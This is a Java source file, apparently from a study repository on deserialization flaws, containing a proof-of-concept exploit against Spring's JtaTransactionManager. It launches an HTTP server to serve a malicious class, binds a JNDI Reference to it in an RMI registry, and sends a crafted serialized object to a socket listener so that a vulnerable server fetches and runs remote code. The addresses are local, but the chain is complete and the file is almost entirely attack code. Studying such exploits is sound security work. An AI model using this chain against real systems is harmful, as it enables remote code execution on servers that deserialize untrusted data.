package com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.net.httpserver.HttpServer;
import org.springframework.transaction.jta.JtaTransactionManager;

import javax.naming.Reference;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * spring  poc 测试
 */

public class SpringPOC {

    /***
     * 启动http服务器，提供下载远程要调用的类
     *
     * @throws IOException
     */
    public static void lanuchCodebaseURLServer() throws IOException {
        System.out.println("Starting HTTP server");
        HttpServer httpServer = HttpServer.create(new InetSocketAddress(8001), 0);
        httpServer.createContext("/", new HttpFileHandler());
        httpServer.setExecutor(null);
        httpServer.start();
    }
    /***
     * 启动RMI服务
     *
     * @throws Exception
     */
    public static void lanuchRMIregister() throws Exception {
        System.out.println("Creating RMI Registry");
        Registry registry = LocateRegistry.createRegistry(1999);
        // 设置code url 这里即为http://http://127.0.0.1:8000/
        // 最终下载恶意类的地址为http://127.0.0.1:8000/com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring.ExportObject.class
        Reference reference = new Reference("com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring.ExportObject", "com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring.ExportObject", "http://127.0.0.1:8001/");
        // Reference包装类
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Object", referenceWrapper);
    }
    /***
     * 发送payload
     *
     * @throws Exception
     */
    public static void sendPayload() throws Exception {
        // jndi的调用地址
        String jndiAddress = "rmi://127.0.0.1:1999/Object";
        // 实例化JtaTransactionManager对象，并且初始化UserTransactionName成员变量
        JtaTransactionManager object = new JtaTransactionManager();
        object.setUserTransactionName(jndiAddress);
        // 发送构造好的payload
        Socket socket = new Socket("127.0.0.1", 9999);
        System.out.println("Sending object to server...");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
        objectOutputStream.writeObject(object);
        objectOutputStream.flush();
        socket.close();
    }
    public static void main(String[] args) throws Exception {
        lanuchCodebaseURLServer();
        lanuchRMIregister();
        sendPayload();
    }
}
